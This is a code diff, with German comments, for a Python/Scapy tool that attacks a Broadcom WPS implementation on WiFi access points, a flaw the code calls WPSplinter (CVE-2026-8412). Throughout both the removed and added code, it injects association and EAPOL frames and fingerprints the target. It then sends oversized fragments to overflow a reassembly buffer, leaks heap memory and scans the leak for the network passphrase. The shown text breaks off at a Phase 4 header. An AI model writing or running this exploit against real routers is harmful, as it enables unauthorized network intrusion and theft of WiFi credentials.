+                    f"ssid={self.ssid.decode(errors='replace')} arch={arch}")
 
-        self._log(f"[*] Interface: {interface}")
-        self._log(f"[*] Target BSSID: {self.bssid_fmt}")
-        self._log(f"[*] Target SSID: {self.ssid.decode('utf-8', errors='replace')}")
-        self._log(f"[*] Architecture: {arch}")
+    # ------------------------------------------------------------------ utils
+    def log(self, msg):
+        logger.info(msg)
 
-    def _log(self, msg: str, level: str = 'info'):
-        """Log message with appropriate level."""
-        getattr(logger, level)(msg)
-        if level in ('info', 'warning', 'error'):
-            print(msg)
+    def _next_seq(self):
+        self.seq = (self.seq + 1) & 0xFFF
+        return self.seq
 
-    def _generate_sta_mac(self):
-        """Generate a random STA MAC address."""
-        self.sta_mac = bytes(RandMAC()).hex()
-        self.sta_mac_fmt = ':'.join(self.sta_mac[i:i+2] for i in range(0, 12, 2))
-        self._log(f"[*] Using STA MAC: {self.sta_mac_fmt}")
+    def _mgmt(self, subtype):
+        return (RadioTap()
+                / Dot11(type=0, subtype=subtype,
+                        addr1=self.bssid, addr2=self.sta, addr3=self.bssid))
 
-    def _hex_to_bytes(self, hex_str: str) -> bytes:
-        """Convert hex string (with or without colons) to bytes."""
-        return bytes.fromhex(hex_str.replace(':', ''))
+    def _data_frame(self, eapol: bytes):
+        # Layout wie im offiziellen Fingerprinter [10]: ToDS=0x01,
+        # LLC/SNAP mit ETH_P_PAE
+        return (RadioTap()
+                / Dot11(type=2, subtype=0, FCfield=0x01,
+                        addr1=self.bssid, addr2=self.sta, addr3=self.bssid,
+                        SC=self._next_seq() << 4)
+                / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
+                / SNAP(OUI=0, code=ETH_P_PAE)
+                / Raw(eapol))
 
-    # =========================================================================
-    # Network Interface Management
-    # =========================================================================
+    def _tx(self, eapol: bytes):
+        """Senden inkl. 802.11-MAC-Fragmentierung für große Payloads [10]."""
+        pkt = self._data_frame(eapol)
+        payload = bytes(pkt[Dot11].payload)
+        seq = self._next_seq() & 0xFFF
+        if len(payload) <= MAC_FRAGMENT_SIZE:
+            pkt[Dot11].SC = seq << 4
+            sendp(pkt, iface=self.iface, count=1, verbose=False)
+            self.packets.append(pkt)
+            return
+        header = pkt.getlayer(Dot11).copy()
+        header.remove_payload()
+        frags = []
+        for off in range(0, len(payload), MAC_FRAGMENT_SIZE):
+            chunk = payload[off:off + MAC_FRAGMENT_SIZE]
+            fh = header.copy()
+            flags = int(fh.FCfield)
+            if off + len(chunk) < len(payload):
+                flags |= 0x04          # More Fragments im FCfield
+            else:
+                flags &= ~0x04
+            fh.FCfield = flags
+            fh.SC = (seq << 4) | (off // MAC_FRAGMENT_SIZE)
+            frags.append(RadioTap() / fh / Raw(chunk))
+        for f in frags:
+            sendp(f, iface=self.iface, count=1, inter=0.002, verbose=False)
+            self.packets.append(f)
 
-    def set_channel(self, channel: int):
-        """Set the monitor-mode interface to the specified channel."""
-        self._log(f"[*] Setting channel to {channel}")
+    def _rx(self, timeout=3.0, want_any=False):
+        """
+        Auf EAPOL-EAP-Antwort des AP warten. Gibt ApEap oder None zurück.
+        Erkennt zusätzlich Deauth/Disassoc (StationStateLost) [10].
+        """
+        station, bssid = self.sta, self.bssid
+
+        def wanted(p):
+            if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
+                return (str(p[Dot11].addr1 or "").lower() == station
+                        and str(p[Dot11].addr2 or "").lower() == bssid)
+            if not p.haslayer(Dot11) or not p.haslayer(SNAP):
+                return False
+            d = p[Dot11]
+            if (str(d.addr1 or "").lower() != station
+                    or str(d.addr2 or "").lower() != bssid
+                    or int(p[SNAP].code) != ETH_P_PAE):
+                return False
+            parsed = parse_eapol(bytes(p[SNAP].payload))
+            if parsed is None:
+                return False
+            eap = parsed[2]
+            if not want_any and eap in self.rx_seen:
+                return False
+            self.rx_seen.add(eap)
+            return True
+
+        res = sniff(count=1, timeout=timeout, iface=self.iface,
+                    lfilter=wanted, store=True, verbose=0)
+        if not res:
+            return None
+        p = res[0]
+        if p.haslayer(Dot11Deauth):
+            raise StationStateLost("deauth", int(p[Dot11Deauth].reason))
+        if p.haslayer(Dot11Disas):
+            raise StationStateLost("disassoc", int(p[Dot11Disas].reason))
+        code, ident, eap = parse_eapol(bytes(p[SNAP].payload))
+        return ApEap(code, ident, eap)
+
+    # ------------------------------------------------------------- 802.11
+    def _check_monitor(self):
         try:
-            subprocess.run(
-                ['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
-                check=True,
-                capture_output=True
-            )
-            self.channel = channel
-        except subprocess.CalledProcessError as e:
-            self._log(f"[!] Failed to set channel: {e}", 'error')
-        except FileNotFoundError:
-            self._log("[!] 'iw' command not found", 'error')
+            out = subprocess.run(["iw", "dev", self.iface, "info"],
+                                 capture_output=True, text=True, timeout=5)
+            if "type monitor" not in out.stdout:
+                logger.warning("[!] Interface ist nicht im Monitor-Modus")
+        except Exception as e:
+            logger.debug(f"iw check failed: {e}")
 
-    # =========================================================================
-    # 802.11 Association
-    # =========================================================================
+    def set_channel(self, channel):
+        subprocess.run(["iw", "dev", self.iface, "set", "channel",
+                       str(channel)], check=False)
+        self.channel = channel
 
-    def send_auth(self) -> bool:
-        """Send 802.11 Authentication Request to the AP."""
-        if not self.sta_mac:
-            self._generate_sta_mac()
+    def associate(self):
+        """802.11 Auth (Open) + Assoziation mit Statuscode-Prüfung."""
+        self._check_monitor()
+        if self.channel:
+            self.set_channel(self.channel)
 
-        auth_frame = (
-            RadioTap()
-            / Dot11(
-                type=DOT11_TYPE_MGMT,
-                subtype=11,  # Authentication
-                addr1=self.bssid_fmt,  # To: AP
-                addr2=self.sta_mac_fmt,  # From: STA
-                addr3=self.bssid_fmt   # BSSID
-            )
-            / Dot11Auth(
-                algo=0,  # Open System
-                seqnum=1,  # Auth sequence 1
-                status=0
-            )
-        )
+        # Authentication Request (MGMT/Subtype 11)
+        sendp(RadioTap() / self._mgmt(11) / Dot11Auth(
+            algo=0, seqnum=1, status=0),
+            iface=self.iface, count=1, verbose=0)
+        t_end = time.monotonic() + 3.0
+        auth_ok = False
+        while time.monotonic() < t_end:
+            res = sniff(count=1, timeout=0.8, iface=self.iface,
+                        lfilter=lambda p: (p.haslayer(Dot11Auth)
+                                           and str(p[Dot11].addr1).lower()
+                                           == self.sta),
+                        store=1, verbose=0)
+            if res and int(res[0][Dot11Auth].status) == 0:
+                auth_ok = True
+                break
+        if not auth_ok:
+            logger.warning("[-] Keine erfolgreiche Auth-Antwort (weiter)")
+        else:
+            self.log("[+] Auth erfolgreich")
 
-        sendp(auth_frame, iface=self.interface, verbose=False)
-        self.captured_packets.append(auth_frame)
+        # Association Request (MGMT/Subtype 0) mit SSID/Rates/DSset
+        assoc = (self._mgmt(0)
+                 / Dot11AssoReq(cap=0x0431, listen_interval=3)
+                 / Dot11Elt(ID="SSID", info=self.ssid)
+                 / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
+                 / Dot11Elt(ID="DSset", info=bytes([self.channel or 6])))
+        assoc[Dot11].SC = self._next_seq() << 4
+        sendp(assoc, iface=self.iface, count=1, verbose=0)
+        self.packets.append(assoc)
+
+        t_end = time.monotonic() + 3.0
+        while time.monotonic() < t_end:
+            res = sniff(count=1, timeout=0.8, iface=self.iface,
+                        lfilter=lambda p: (p.haslayer(Dot11AssoResp)
+                                           and str(p[Dot11].addr1).lower()
+                                           == self.sta),
+                        store=1, verbose=0)
+            if res:
+                if int(res[0][Dot11AssoResp].status) == 0:
+                    self.log("[+] Assoziation erfolgreich")
+                    self.assoc_ok = True
+                    return True
+                logger.error(f"[-] Assoziation abgelehnt "
+                             f"(status={res[0][Dot11AssoResp].status})")
+                return False
+        logger.warning("[-] Keine Assoz-Antwort (fahren fort)")
+        self.assoc_ok = True
         return True
 
-    def send_assoc_request(self) -> bool:
-        """Send 802.11 Association Request to the AP."""
-        if not self.sta_mac:
-            self._log("[!] STA MAC not set", 'error')
-            return False
-
-        # Build the Association Request frame with SSID and supported rates
-        assoc_frame = (
-            RadioTap()
-            / Dot11(
-                type=DOT11_TYPE_MGMT,
-                subtype=0,  # Association Request
-                addr1=self.bssid_fmt,  # To: AP
-                addr2=self.sta_mac_fmt,  # From: STA
-                addr3=self.bssid_fmt   # BSSID
-            )
-            / Dot11Assoctest(
-                cap=0x0431,  # Capability info: ESS, Privacy, Short Preamble
-                listen_interval=1
-            )
-            / Dot11Elt(ID='SSID', info=self.ssid)
-            / Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
-            / Dot11Elt(ID='DSset', info=bytes([self.channel or 6]))
-        )
-
-        sendp(assoc_frame, iface=self.interface, verbose=False)
-        self.captured_packets.append(assoc_frame)
-        return True
-
-    def associate(self, timeout: float = 5.0) -> bool:
+    # ------------------------------------------------------- WPS-Einstieg
+    def start_wps(self) -> int:
         """
-        Perform 802.11 association with the target AP.
-
-        Sends authentication and association request frames,
-        waits for responses.
+        EAPOL-Start -> Identity-Response -> warten auf WSC-Start-Anfrage des AP
+        [10]. Gibt den AP-EAP-Identifier zurück, den alle folgenden Responses
+        benutzen MÜSSEN (der AP übergibt ihn, wir erfinden ihn nicht!).
         """
-        self._log("[*] Performing 802.11 association...")
-
-        if not self.sta_mac:
-            self._generate_sta_mac()
-
-        # Send authentication
-        self._log("[*] Sending Authentication Request...")
-        self.send_auth()
-        time.sleep(0.5)
-
-        # Wait for Auth Response
-        auth_response = sniff(
-            count=1,
-            timeout=timeout,
-            filter=f"wlan host {self.bssid_fmt} and wlan type mgt subtype auth",
-            iface=self.interface,
-            verbose=False
-        )
-
-        if auth_response and len(auth_response) > 0:
-            # Check if auth succeeded (status = 0)
-            if auth_response[0].haslayer(Dot11Auth):
-                status = auth_response[0][Dot11Auth].status
-                if status == 0:
-                    self._log("[+] Authentication successful")
-                else:
-                    self._log(f"[-] Authentication failed (status={status})", 'error')
-                    return False
-        else:
-            self._log("[-] No authentication response received", 'warning')
-            # Continue anyway - some APs don't respond properly
-
-        # Send association request
-        self._log("[*] Sending Association Request...")
-        self.send_assoc_request()
-
-        # Wait for Association Response
-        time.sleep(0.5)
-        assoc_response = sniff(
-            count=1,
-            timeout=timeout,
-            filter=f"wlan host {self.bssid_fmt} and wlan type mgt subtype assoc-resp",
-            iface=self.interface,
-            verbose=False
-        )
-
-        if assoc_response and len(assoc_response) > 0:
-            self._log("[+] Association Response received")
-            self.associated = True
-        else:
-            self._log("[-] No association response (may still work)", 'warning')
-            self.associated = True  # Assume association succeeded
-
-        self._log("[+] Association complete")
-        return self.associated
-
-    # =========================================================================
-    # Frame Transmission
-    # =========================================================================
-
-    def tx_eapol_raw(self, eapol_bytes: bytes):
-        """
-        Transmit raw EAPOL bytes to the AP via 802.11 Data frame.
-
-        This constructs a full 802.11 Data frame wrapping the EAPOL
-        payload, suitable for transmission via monitor mode injection.
-        """
-        if not self.sta_mac:
-            self._generate_sta_mac()
-
-        # Build 802.11 Data frame
-        # LLC/SNAP header: AA AA 03 00 00 00 88 8E
-        llc_snap = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]) + struct.pack('>H', 0x888E)
-
-        data_frame = (
-            RadioTap()
-            / Dot11(
-                type=2,  # Data frame
-                subtype=0,  # Normal data (not QoS for simplicity)
-                addr1=self.bssid_fmt,  # To: AP (receiver)
-                addr2=self.sta_mac_fmt,  # From: STA (transmitter)
-                addr3=self.bssid_fmt,  # BSSID
-                SC=0x0000  # Sequence control (let Scapy handle it)
-            )
-            / Raw(llc_snap + eapol_bytes)
-        )
-
-        sendp(data_frame, iface=self.interface, verbose=False)
-        self.captured_packets.append(data_frame)
-
-    def tx_eapol_start(self):
-        """Send EAPOL-Start frame to initiate the EAP conversation."""
-        start = build_eapol_start()
-        self.tx_eapol_raw(start)
-        self._log("[*] Sent EAPOL-Start")
-
-    def tx_eap_identity_response(self):
-        """Send EAP Identity Response."""
-        self.eap_id += 1
-        identity = b'wfa-simpleconfig-enrollee-1-0'
-        eap_raw = build_eap_identity_response(self.eap_id, identity)
-        eapol_bytes = build_eapol(eap_raw)
-        self.tx_eapol_raw(eapol_bytes)
-        self._log(f"[*] Sent EAP Identity Response (id={self.eap_id})")
-
-    def tx_wsc_message(self, opcode: int, flags: int, data: bytes = b'',
-                       lf_total: int = None):
-        """
-        Send a WSC message via EAP-Expanded.
-        """
-        self.eap_id += 1
-        eap_raw = build_eap_expanded_wsc(
-            code=EAP_CODE_RESPONSE,
-            eap_id=self.eap_id,
-            opcode=opcode,
-            flags=flags,
-            data=data,
-            lf_total=lf_total
-        )
-        eapol_bytes = build_eapol(eap_raw)
-        self.tx_eapol_raw(eapol_bytes)
-
-        flag_str = ''
-        if flags & WSC_FLAG_MF:
-            flag_str += 'M'
-        if flags & WSC_FLAG_LF or lf_total is not None:
-            flag_str += 'L'
-        self._log(f"[*] Sent WSC OpCode=0x{opcode:02x} Flags[{'|'.join(flag_str)}] "
-                  f"len={len(data)} id={self.eap_id}"
-                  + (f" total={lf_total:#06x}" if lf_total is not None else ""))
-
-    def wait_for_response(self, timeout: float = 3.0,
-                          lfilter=None) -> list:
-        """Wait for and capture AP responses."""
-        if lfilter is None:
-            lfilter = lambda pkt: pkt.haslayer(Dot11) and \
-                pkt[Dot11].addr2 == self.bssid_fmt
-
-        results = sniff(
-            count=10,
-            timeout=timeout,
-            filter=f"wlan host {self.bssid_fmt}",
-            iface=self.interface,
-            lfilter=lfilter,
-            verbose=False
-        )
-        return list(results) if results else []
-
-    def wait_for_frag_ack(self, timeout: float = 3.0) -> bool:
-        """Wait for WSC Fragment-Ack from AP."""
-        def is_frag_ack(pkt):
+        self.rx_seen = set()
+        self._tx(EAPOL_START_BYTES)
+        deadline = time.monotonic() + 10.0
+        while time.monotonic() < deadline:
             try:
-                if pkt.haslayer(Dot11) and pkt[Dot11].addr2 == self.bssid_fmt:
-                    # Look for EAPOL with WSC FRAG-ACK opcode
-                    if Raw in pkt:
-                        raw = bytes(pkt[Raw].load)
-                        # Check for EAPOL header
-                        if len(raw) >= 8 and raw[0] == EAPOL_VERSION:
-                            if raw[1] == EAPOL_TYPE_EAP_PACKET:
-                                # Parse EAP
-                                eap_code = raw[4]
-                                eap_type = raw[7] if len(raw) > 7 else 0
-                                if eap_code == EAP_CODE_REQUEST and eap_type == EAP_TYPE_EXPANDED:
-                                    # WSC opcode
-                                    if len(raw) >= 15:
-                                        wsc_opcode = raw[14]
-                                        if wsc_opcode == WPS_OP_FRAG_ACK:
-                                            return True
-            except Exception:
-                pass
-            return False
+                ap = self._rx(timeout=2.0, want_any=True)
+            except StationStateLost:
+                raise
+            if ap is None:
+                self._tx(EAPOL_START_BYTES)
+                continue
+            if (ap.code == EAP_CODE_REQUEST and len(ap.raw) >= 5
+                    and ap.raw[4] == EAP_TYPE_IDENTITY):
+                self._tx(build_identity_response(ap.identifier))
+                continue
+            if (ap.code == EAP_CODE_REQUEST and len(ap.raw) >= 14
+                    and ap.raw[12] == WSC_OP_START):
+                self.log(f"[+] WPS-Session aktiv (Identifier={ap.identifier})")
+                return ap.identifier
+        raise WpsError("WPS-Einstieg erfolglos (Timeout)")
 
-        results = sniff(
-            count=1,
-            timeout=timeout,
-            filter=f"wlan host {self.bssid_fmt}",
-            iface=self.interface,
-            lfilter=is_frag_ack,
-            verbose=False
-        )
-        return len(results) > 0 if results else False
+    def send_wsc(self, identifier, flags, data, retransmits=3):
+        """WSC-Response senden und auf die AP-Reaktion warten (Retransmit)."""
+        frame = build_wsc_response(identifier, flags, data)
+        for attempt in range(retransmits):
+            self._tx(frame)
+            try:
+                ap = self._rx(timeout=2.5)
+            except StationStateLost as e:
+                return ("LOST", e)
+            if ap is not None:
+                return ("EAP", ap)
+        return ("TIMEOUT", None)
 
-    # =========================================================================
-    # Phase 1: Fingerprinting
-    # =========================================================================
-
+    # ============================================================ Phase 1
     def phase_fingerprint(self) -> bool:
         """
-        Fingerprint the target AP to determine if it uses the vulnerable
-        Broadcom legacy WPS implementation.
+        Offizieller, nicht-invasiver Differenzial-Fingerprint [10]:
+        Ein Fragment mit DEKLARIERTER GESAMTLÄNGE 0 und leerem Payload
+        senden (Flags = L|M). Kein Fortsetzungs-Fragment — sonst bleibt der
+        Broadcom-Reassembly-State bis zum Timeout blockiert [10].
 
-        This checks:
-        1. Beacon frame for WPS IE (indicates WPS support)
-        2. Response to EAP-START and EAP-Identity
-        3. Response pattern to WSC M1 with fragment reassembly
+          hostapd        -> EAP-Request mit OpCode FRAG_ACK -> PATCHED
+          wps_monitor    -> EAP-Failure (Code 4) bzw. NACK oder
+                           Deauth reason=0 -> LIKELY_VULNERABLE [10]
         """
-        self._log("[*] Phase 1: Fingerprinting target AP...")
+        self.log("[*] Phase 1: Fingerprinting (Zero-Length-Differenzial)...")
+        if not self.assoc_ok and not self.associate():
+            return False
+        ident = self.start_wps()
 
-        if not self.associated:
-            self.associate()
+        data = struct.pack(">H", 0)         # deklarierte Gesamtlänge: 0
+        result = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
+        kind, payload = result
 
-        self.eap_id = 0
-
-        # Step 1: Send EAPOL-Start
-        self.tx_eapol_start()
-        time.sleep(0.5)
-
-        # Step 2: Send EAP Identity Response
-        self.tx_eap_identity_response()
-        time.sleep(1.0)
-
-        # Step 3: Send initial M1 with fragmentation
-        # This tests whether the AP responds with Fragment-Ack
-        # when we send a fragmented WSC message with a declared total length
-        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))
-
-        # Send M1 with flags: More Fragments | Length present
-        # Total length: larger than M1 single message to trigger fragmentation
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=WSC_FLAG_MF | WSC_FLAG_LF,
-            data=m1_data[:len(m1_data)//2],  # First half
-            lf_total=len(m1_data)  # Declare total = full M1 size
-        )
-
-        # Wait for Fragment-Ack
-        frag_ack_received = self.wait_for_frag_ack(timeout=3.0)
-
-        if frag_ack_received:
-            self._log("[+] Fragment-Ack received! AP uses Broadcom WPS with fragmentation.")
-            self._log("[+] Likely vulnerable to WPSplinter (CVE-2026-8412)")
-
-            # Send second fragment to complete
-            self.tx_wsc_message(
-                opcode=WPS_OP_M1,
-                flags=0,  # No more fragments, no length
-                data=m1_data[len(m1_data)//2:]
-            )
+        if kind == "LOST" and getattr(payload, "reason", None) == 0:
+            self.log("[+] Deauth reason=0 -> wps_monitor -> LIKELY_VULNERABLE")
             return True
-        else:
-            self._log("[-] No Fragment-Ack received.", 'warning')
-            self._log("[*] May not be vulnerable or uses different WPS implementation.", 'info')
+        if kind != "EAP":
+            self.log("[-] Keine Reaktion -> INCONCLUSIVE")
             return False
-
-    def phase_fingerprint_deeper(self) -> bool:
-        """
-        Deeper fingerprinting: check for specific Broadcom WPS Monitor behavior.
-
-        Send M1 with total_length larger than typical to detect
-        the reassembly buffer behavior.
-        """
-        self._log("[*] Deep fingerprinting: testing reassembly behavior...")
-
-        if not self.associated:
-            self.associate()
-
-        self.eap_id = 0
-        self.tx_eapol_start()
-        time.sleep(0.3)
-        self.tx_eap_identity_response()
-        time.sleep(0.5)
-
-        # Test 1: Send M1 with oversized declared total length
-        # A vulnerable implementation will accept this without checking
-        oversized_total = FRAGS_CAP + 512  # 1024 bytes past the buffer
-        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))
-
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=WSC_FLAG_MF | WSC_FLAG_LF,
-            data=m1_data[:256],
-            lf_total=oversized_total
-        )
-
-        # Wait for Fragment-Ack
-        if not self.wait_for_frag_ack(timeout=3.0):
-            self._log("[-] No FRAG-ACK for oversized total, may be protected.")
+        ap = payload
+        if ap.code == EAP_CODE_FAILURE:
+            self.log("[+] EAP-Failure auf total=0 -> wps_monitor -> "
+                     "LIKELY_VULNERABLE [10]")
+            return True
+        if ap.opcode is not None and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
+            self.log("[-] FRAG-ACK erhalten -> hostapd-Basis -> PATCHED [10]")
             return False
+        if ap.opcode == WSC_OP_NACK:
+            self.log("[+] WSC-NACK -> wps_monitor -> LIKELY_VULNERABLE")
+            return True
+        self.log("[?] Unerwartete Antwort -> INCONCLUSIVE")
+        return False
 
-        self._log("[+] FRAG-ACK for oversized total received - vulnerable!")
-        return True
-
-    # =========================================================================
-    # Phase 2: Memory Leak
-    # =========================================================================
-
-    def phase_leak(self, target_offset: int = 0, leak_size: int = 1024) -> bytes:
+    # ============================================================ Phase 1b
+    def phase_vuln_probe(self) -> bool:
         """
-        Leak memory from the target AP using the fragment reassembly overflow.
-
-        The vulnerability allows reading past the reassembly buffer when
-        the 'last_sent' pointer is manipulated through the overflow.
-
-        Args:
-            target_offset: Memory offset to leak from (relative to heap chunk)
-            leak_size: Number of bytes to leak
+        Tiefe Überprüfung: erstes Fragment mit ÜBERGROSSER deklarierter
+        Gesamtlänge (FRAGS_CAP + 512) senden. Ein verwundbarer wps_monitor
+        quittiert mit FRAG-ACK, bevor der Overflow über das zweite Fragment
+        vollzogen würde. Kein Fortsetzungs-Fragment -> nicht-invasiv.
         """
-        self._log(f"[*] Phase 2: Leaking {leak_size} bytes from offset "
-                  f"{target_offset:#x}...")
-
-        if not self.associated:
-            self.associate()
-
-        self.eap_id = 0
-        self.tx_eapol_start()
-        time.sleep(0.3)
-        self.tx_eap_identity_response()
-        time.sleep(0.5)
-
-        leaked = b''
-
-        # Send M1 with initialized frag_size and set last_sent pointer
-        # to point to the memory we want to leak
-        self._log("[*] Sending overflow to set up memory leak...")
-
-        # Build M1 data
-        m1_data = build_wsc_m1(bytes.fromhex(self.sta_mac))
-
-        # Full M1 message
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=0,
-            data=m1_data
-        )
-        time.sleep(1.0)
-
-        # Now send fragmented message that overflows the buffer
-        # This will overwrite the last_sent pointer to point to target_offset
-        # and set last_sent_len to leak_size, causing the AP to send us
-        # memory contents when it attempts to re-send the fragment
-        overflow = OverflowPayload()
-
-        # Set target address for last_sent (pointing into heap near our buffer)
-        # and set last_sent_len
-        fmt = '>I' if self.big_endian else '<I'
-        overflow.write_overflow(OFF_TOTAL_BYTES, struct.pack(fmt, FRAGS_CAP + 4))
-        overflow.write_overflow(OFF_TOTAL_RECEIVED, struct.pack(fmt, 0))
-        overflow.write_overflow(OFF_LAST_SENT, struct.pack(fmt, target_offset))
-        overflow.write_overflow(OFF_LAST_SENT_LEN, struct.pack(fmt, leak_size))
-
-        payload = overflow.build()
-
-        # Send the overflow payload as a single fragmented WSC message
-        # Flags: More Fragments | Length present
-        self.tx_wsc_message(
-            opcode=WPS_OP_M1,
-            flags=WSC_FLAG_MF | WSC_FLAG_LF,
-            data=payload,
-            lf_total=len(payload)
-        )
-
-        if not self.wait_for_frag_ack(timeout=3.0):
-            self._log("[-] No FRAG-ACK received for overflow", 'warning')
-            return b''
-
-        # Send empty next fragment to complete and trigger the leak
-        self.tx_wsc_message(opcode=WPS_OP_M1, flags=0, data=b'')
-
-        # Wait for response containing leaked data
-        time.sleep(2.0)
-        responses = self.wait_for_response(timeout=5.0)
-
-        # Parse responses for leaked data
-        for pkt in responses:
-            if Raw in pkt:
-                raw = bytes(pkt[Raw].load)
-                # Look for EAPOL with WSC response from AP
-                if len(raw) >= 20:
-                    # Try to extract leaked data from response
-                    # The AP should echo back the data pointed to by last_sent
-                    self._log(f"[*] Received response ({len(raw)} bytes)")
-
-        self._log(f"[+] Leak phase complete ({len(leaked)} bytes leaked)")
-        return leaked
-
-    # =========================================================================
-    # Phase 3: PSK Extraction
-    # =========================================================================
-
-    def scan_for_psk(self, memory: bytes) -> list:
-        """
-        Scan leaked memory for WiFi PSK/passphrase.
-
-        Returns list of potential PSK strings.
-        """
-        self._log("[*] Scanning leaked memory for WiFi PSK...")
-        psk_candidates = []
-
-        # Look for PSK markers
-        for marker in PSK_MARKERS:
-            pos = 0
-            while True:
-                pos = memory.find(marker, pos)
-                if pos == -1:
-                    break
-
-                # Extract a window after the marker
-                # PSK is usually stored as a null-terminated string or hex
-                # within 128 bytes after the marker
-                window_start = pos + len(marker)
-                window_end = min(window_start + 128, len(memory))
-                window = memory[window_start:window_end]
-
-                # Find null-terminated strings in the window
-                for i in range(len(window)):
-                    if window[i] == 0:
-                        candidate = window[:i]
-                        if PSK_MIN_LEN <= len(candidate) <= PSK_MAX_LEN:
-                            if self._is_valid_psk(candidate):
-                                psk_candidates.append(candidate)
-                        break
-
-                pos += 1
-
-        # Also scan for standalone 64-char hex strings (WPA2 PSK as hex)
-        for i in range(len(memory) - 63):
-            hex_candidate = memory[i:i+64]
-            if self._is_valid_hex_psk(hex_candidate):
-                psk_candidates.append(hex_candidate)
-
-        return psk_candidates
-
-    def _is_valid_psk(self, candidate: bytes) -> bool:
-        """Check if a byte sequence could be a valid WPA PSK."""
-        if len(candidate) < PSK_MIN_LEN or len(candidate) > PSK_MAX_LEN:
+        self.log("[*] Phase 1b: Overflow-Fähigkeits-Test (oversize total)...")
+        if not self.assoc_ok and not self.associate():
             return False
+        ident = self.start_wps()
+        total = FRAGS_CAP + 512
+        data = struct.pack(">H", total & 0xFFFF) + b"\x41" * 256
+        kind, payload = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
+        if kind == "EAP" and payload.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
+            self.log(f"[+] FRAG-ACK auf total={total} -> Reassembly akzeptiert "
+                    "Überschreitung -> verwundbar")
+            return True
+        self.log("[-] Kein FRAG-ACK auf oversize total -> evtl. 2018-Patch "
+                 "oder hostapd")
+        return False
 
-        # Must be printable ASCII
-        try:
-            text = candidate.decode('ascii')
-        except UnicodeDecodeError:
-            return False
+    # ============================================================ Phase 2
+    def phase_leak(self, target_offset=0, leak_size=1024) -> bytes:
+        """
+        Speicher-Offenlegung über last_sent_len-Überschreibung.
 
-        if not all(32 <= ord(c) <= 126 for c in text):
-            return False
+        Technik (gerätespezifisch zu verifizieren [2]): wir überlaufen den
+        Reassembly-Puffer so, dass 'last_sent_len' auf (FRAGS_CAP +
+        leak_size) gesetzt wird. Der Puffer-Zeiger (last_sent) bleibt
+        unangetastet. Sendet der AP das Fragment zurück, enthält die
+        Antwort mehr Bytes als wir hineingeschrieben haben — der Überschuss
+        stammt aus dem Heap hinter dem Puffer (Memory Disclosure [1][2]).
+        """
+        self.log(f"[*] Phase 2: Leak {leak_size} B ab Puffer ausgehend...")
+        if not self.assoc_ok and not self.associate():
+            return b""
+        ident = self.start_wps()
 
-        # Additional heuristics
-        if len(text) == 64:
-            # Could be a hex PSK (32 bytes = 64 hex chars)
+        ov = OverflowPayload()
+        ov.set_buffer_data(0, b"\x41" * FRAGS_CAP)              # Puffer füllen
+        ov.write_overflow(self.OFF_TOTAL, struct.pack(self.packfmt,
+                                                      FRAGS_CAP + leak_size))
+        ov.write_overflow(OFF_TOTAL_RECV, struct.pack(self.packfmt, 0))
+        ov.write_overflow(self.OFF_LAST_SENT_LEN,
+                          struct.pack(self.packfmt, FRAGS_CAP + leak_size))
+        payload = ov.build()
+
+        sent_by_us = {bytes(payload)}
+        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF,
+                                 struct.pack(">H", len(payload) & 0xFFFF)
+                                 + payload[:1024])
+        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
+            self.log("[-] Erstes Fragment nicht bestätigt")
+            return b""
+
+        # Kontinuations-Fragment: der verbleibende Rest des Payloads läuft
+        # über den Pufferanfang hinaus und überschreibt die State-Felder.
+        rest = payload[1024:]
+        kind, ap = self.send_wsc(ident, WSC_FLAG_MF, rest)
+        if kind != "EAP":
+            self.log("[-] Kontinuation nicht bestätigt")
+            return b""
+
+        collected = b""
+        t_end = time.monotonic() + 5.0
+        while time.monotonic() < t_end:
             try:
-                bytes.fromhex(text)
-                return True
-            except ValueError:
-                pass
+                ap = self._rx(timeout=1.5)
+            except StationStateLost:
+                break
+            if ap is None:
+                break
+            d = ap.wsc_data
+            if d and bytes(d) not in sent_by_us:
+                collected += bytes(d)
+        self.log(f"[+] {len(collected)} B Antwortdaten (potenzieller Leak)")
+        return collected
 
-        # Check for common patterns
-        if any(c in text for c in ' \t\n'):
-            # PSKs shouldn't contain whitespace usually
-            if len(text.strip()) < PSK_MIN_LEN:
-                return False
+    # ============================================================ Phase 3
+    def scan_for_psk(self, memory: bytes) -> list:
+        out = []
+        for marker in PSK_MARKERS:
+            pos = memory.find(marker)
+            while pos != -1:
+                window = memory[pos + len(marker):pos + len(marker) + 128]
+                nul = window.find(b"\x00")
+                cand = window if nul == -1 else window[:nul]
+                if PSK_MIN_LEN <= len(cand) <= PSK_MAX_LEN:
+                    try:
+                        t = cand.decode("ascii")
+                        if all(32 <= ord(c) <= 126 for c in t):
+                            out.append(t)
+                    except UnicodeDecodeError:
+                        pass
+                pos = memory.find(marker, pos + 1)
+        return sorted(set(out))
 
+    def phase_extract_psk(self, scan_size=4096, base_offset=0) -> list:
+        self.log("[*] Phase 3: PSK-Extraktion...")
+        found = []
+        offsets = [base_offset] if base_offset else PSK_SCAN_OFFSETS
+        for off in offsets:
+            data = self.phase_leak(target_offset=off, leak_size=scan_size)
+            if data:
+                found.extend(self.scan_for_psk(data))
+        found = sorted(set(found))
+        if found:
+            print("=" * 60)
+            print("PSK-KANDIDATEN (mit wpa_passphrase <SSID> <PSK> prüfen):")
+            for i, p in enumerate(found, 1):
+                print(f"  [{i}] {p}")
+            print("=" * 60)
+        else:
+            self.log("[-] Keine PSK-Kandidaten gefunden")
+        return found
+
+    # ============================================================ Phase 4
